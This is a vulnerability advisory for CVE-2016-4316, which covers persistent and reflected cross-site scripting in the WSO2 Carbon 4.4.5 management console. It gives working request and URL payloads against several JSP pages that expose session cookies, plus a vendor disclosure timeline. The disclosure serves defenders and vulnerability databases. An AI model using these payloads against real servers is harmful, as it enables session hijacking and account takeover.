@@ -1,0 +1,125 @@
+[+] Credits: John Page aka HYP3RLINX
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/WSO2-CARBON-v4.4.5-PERSISTENT-XSS-COOKIE-THEFT.txt
+
+[+] ISR: ApparitionSec
+
+
+Vendor:
+=============
+www.wso2.com
+
+
+Product:
+==================
+Ws02Carbon v4.4.5
+
+WSO2 Carbon is the core platform on which WSO2 middleware products are built. It is based on Java OSGi technology, which allows
+components to be dynamically installed, started, stopped, updated, and uninstalled, and it eliminates component version conflicts.
+In Carbon, this capability translates into a solid core of common middleware enterprise components, including clustering, security,
+logging, and monitoring, plus the ability to add components for specific features needed to solve a specific enterprise scenario.
+
+
+Vulnerability Type:
+===========================
+Persistent / Reflected
+Cross Site Scripting (XSS) - Cookie Disclosure
+
+
+CVE Reference:
+==============
+CVE-2016-4316
+
+
+Vulnerability Details:
+=====================
+
+WSo2 Carbon has multiple XSS vectors allowing attackers to inject client-side scripts into web pages viewed by other users.
+A cross-site scripting vulnerability may be used by attackers to bypass access controls such as the same-origin policy,
+stealing session cookies and used as a platform for further attacks on the system.
+
+
+Exploit code(s)
+===============
+
+
+Persistent XSS:
+
+GET Request
+https://victim-server:9443/carbon/identity-mgt/challenges-mgt.jsp?addRowId=XSS&setName="/><script>alert(document.cookie)</script>
+
+
+Request two is POST
+/carbon/identity-mgt/challenges-mgt-finish.jsp
+
+setName=%22%2F%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&question0=&question1=City+where+you+were+born+%3F&setId1=http%3A%2F%2Fwso2.org%2Fclaims%2FchallengeQuestion1&question1=City+where+you+were+born+%3F&question2=Father%27s+middle+name+%3F&setId2=http%3A%2F%2Fwso2.org%2Fclaims%2FchallengeQuestion1&question2=Father%27s+middle+name+%3F&question3=Name+of+your+first+pet+%3F&setId3=http%3A%2F%2Fwso2.org%2Fclaims%2FchallengeQuestion2&question3=Name+of+your+first+pet+%3F&question4=Favorite+sport+%3F&setId4=http%3A%2F%2Fwso2.org%2Fclaims%2FchallengeQuestion2&question4=Favorite+sport+%3F&question5=Favorite+food+%3F&setId5=http%3A%2F%2Fwso2.org%2Fclaims%2FchallengeQuestion1&question5=Favorite+food+%3F&question6=Favorite+vacation+location+%3F&setId6=http%3A%2F%2Fwso2.org%2Fclaims%2FchallengeQuestion1&question6=Favorite+vacation+location+%3F&question7=Model+of+your+first+car+%3F&setId7=http%3A%2F%2Fwso2.org%2Fclaims%2FchallengeQuestion2&question7=Model+of+your+first+car+%3F&question8=Name+of+the+hospital+where+you+were+born+%3F&setId8=http%3A%2F%2Fwso2.org%2Fclaims%2FchallengeQuestion2&question8=Name+of+the+hospital+where+you+were+born+%3F&setId9=%22%2F%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&question9=XSS
+
+
+Then XSS payload will be listed here in below URL:
+
+https://victim-server:9443/carbon/identity-mgt/challenges-set-mgt.jsp?region=region1&item=identity_security_questions_menu
+
+Finally when victim clicks to "Delete" entry on the page the XSS is executed.
+
+Here is stored payload from the HTML source
+
+<a onclick="removeSet('\x22/><script>alert(666)</script>')" style='background-image:url(images/delete.gif);'  type="button" class="icon-link">Delete</a></td>
+
+
+///////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+Reflected XSS 
+
+XSS #1 
+https://victim-server:9443/carbon/webapp-list/webapp_info.jsp?webappFileName=odata.war&webappState=all&hostName=victim-server&httpPort=9763&defaultHostName=victim-server&webappType=%22/%3E%3Cscript%3Ealert%28%27XSS%20hyp3rlinx%20\n\n%27%20%2bdocument.cookie%29%3C/script%3E
+
+
+XSS #2 
+https://victim-server:9443/carbon/ndatasource/newdatasource.jsp?dsName=%22onMouseMove=%22alert%28%27XSS%20by%20hyp3rlinx%20\n\n%27%2bdocument.cookie%29&edit=HELL
+
+
+XSS #3
+https://victim-server:9443/carbon/ndatasource/newdatasource.jsp?description=%22onMouseMove=%22alert%28%27XSS%20by%20hyp3rlinx%20\n\n%27%2bdocument.cookie%29&edit=true
+
+
+XSS #4
+https://victim-server:9443/carbon/webapp-list/webapp_info.jsp?webappFileName=odata.war&webappState=all&hostName=victim-server&httpPort=%22/%3E%3Cscript%3Ealert%28%27XSS%20hyp3rlinx%20\n\n%27%20%2bdocument.cookie%29%3C/script%3E&defaultHostName=victim-server&webappType=
+
+XSS #5
+https://victim-server:9443/carbon/viewflows/handlers.jsp?retainlastbc=true&flow=in&phase=%22/%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E
+
+
+XSS #6
+https://victim-server:9443/carbon/ndatasource/validateconnection-ajaxprocessor.jsp?&dsName=WSO2_CARBON_DB&driver=com.mysql.jdbc.Driver&url=%22/%3E%3Cscript%3Ealert%28666%29%3C/script%3E&username=root&dsType=RDBMS&customDsType=RDBMS&dsProviderType=default&dsclassname=undefined&dsclassname=undefined&dsproviderProperties=undefined&editMode=false&changePassword=true&newPassword=
+
+
+Disclosure Timeline:
+===========================================
+Vendor Notification: May 6, 2016
+Vendor Acknowledgement: May 6, 2016
+Vendor Fix / Customer Alerts: June 30, 2016
+August 12, 2016  : Public Disclosure
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+Severity Level:
+===============
+Medium
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere.
+
+HYP3RLINX
